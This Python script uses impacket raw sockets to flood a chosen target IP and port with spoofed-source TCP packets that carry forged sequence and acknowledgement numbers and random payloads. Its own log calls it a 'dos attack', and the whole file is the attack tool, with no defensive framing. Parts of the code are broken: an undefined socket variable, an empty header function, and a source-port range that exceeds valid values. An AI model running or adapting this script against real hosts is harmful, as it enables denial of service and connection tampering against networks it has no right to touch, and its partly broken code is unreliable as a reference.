import argparse
import os
import random
import time
from subprocess import check_output
import logging
import csv
import select
import socket

from impacket import ImpactDecoder, ImpactPacket

def sendeth(ethernet_packet, payload, interface):
    sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW)
    sock.bind((interface, 0))
    return s.send(ethernet_packet + payload)

def pack(byte_sequence):
    """Convert list of bytes to byte string."""
    return b"".join(map(chr, byte_sequence))

def byte2hex(bytestr):
    return ''.join(["%02X" % ord(x) for x in bytestr]).strip()

def hex2byte(hexstr):
    byte = []
    hexstr = ''.join(hexstr.split(" "))
    for i in range(0, len(hexstr), 2):
        byte.append(chr(int(hexstr[i:i+2], 16)))
    return ''.join(byte)

def create_ethhdr(src, dst):
    pass


def get_arp_table():
    with open('/proc/net/arp') as arpt:
        names = [
            'IP address', 'HW type', 'Flags', 'HW address', 'Mask', 'Device' 
        ]

        reader = csv.DictReader(arpt, fieldnames=names, skipinitialspace=True,
                                delimiter=' ')

        return [block for block in reader]

def get_mac(arp_table, ip):
    for entry in arp_table:
        if entry['IP address'] == ip:
            return entry['HW address']

def sequence_number_attack():
    i = random.randint(0, 100)
    j = random.randint(0, 200)
    k = random.randint(0, 200)
    s = i * 90 + j * 70 + k * 80
    seq = s % ((2**31) - 1)
    return seq

def create_packet(size):
    return os.urandom(int(size))

parser = argparse.ArgumentParser()
parser.add_argument("--spoof", type=str, dest="sip", action="store")
parser.add_argument("--dip", type=str, dest="dip", action="store")
parser.add_argument("--dport", type=int, dest="dport", action="store")
parser.add_argument("--sport", type=int, dest="sport", action="store")
parser.add_argument("--inter", type=float, dest="inter", action="store")

args = parser.parse_args()

sip = args.sip
dip = args.dip
dport = args.dport
inter = args.inter

sport = args.sport
if not sport:
    sport = random.randint(0, (2**32)-1)

logger = logging.getLogger()
logger.setLevel(logging.DEBUG)
formatter = logging.Formatter('%(asctime)s : %(levelname)s : %(message)s')
log_name = '../logs/attack_spoof.log'
if os.path.exists(log_name): 
    os.remove(log_name)
file_handler = logging.FileHandler(filename=log_name)
file_handler.setLevel(logging.DEBUG)
file_handler.setFormatter(formatter)
logger.addHandler(file_handler)

logger.debug("Running dos attack")
logger.debug("SIP: %s, DIP: %s, SIP: %s,DPORT: %s, INTER: %s", sip, dip,
             sport, dport, inter)

s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
RWIND = 64000
nbrun = (2**32)/RWIND

for size in [64000, 32000]:

    nbrun = (2**32)

    for i in xrange(nbrun):
        ip = ImpactPacket.IP()
        ip.set_ip_src(sip)
        ip.set_ip_dst(dip)

        ack1 = 0

        seq = (size/2) + i*size 

        tcp = ImpactPacket.TCP()
        tcp.set_th_sport(sport)
        tcp.set_th_dport(dport)
        tcp.set_th_seq(seq)
        tcp.set_th_ack(ack1)
        tcp.set_th_win(4096)
        tcp.set_PSH()
        tcp.calculate_checksum()
        tcp.contains(ImpactPacket.Data(create_packet(156)))
        ip.contains(tcp)
        s.sendto(ip.get_packet(), (dip, 0))

        ip_pkt = ImpactPacket.IP()
        ip_pkt.set_ip_src(sip)
        ip_pkt.set_ip_dst(dip)

        ack2 = 2**31

        pkt = ImpactPacket.TCP()
        pkt.set_th_sport(sport)
        pkt.set_th_dport(dport)
        pkt.set_th_seq(seq)
        pkt.set_th_ack(ack2)
        pkt.set_th_win(4096)
        pkt.set_PSH()
        pkt.calculate_checksum()
        pkt.contains(ImpactPacket.Data(create_packet(156)))
        ip_pkt.contains(pkt)
        s.sendto(ip_pkt.get_packet(), (dip, 0))

        time.sleep(inter)
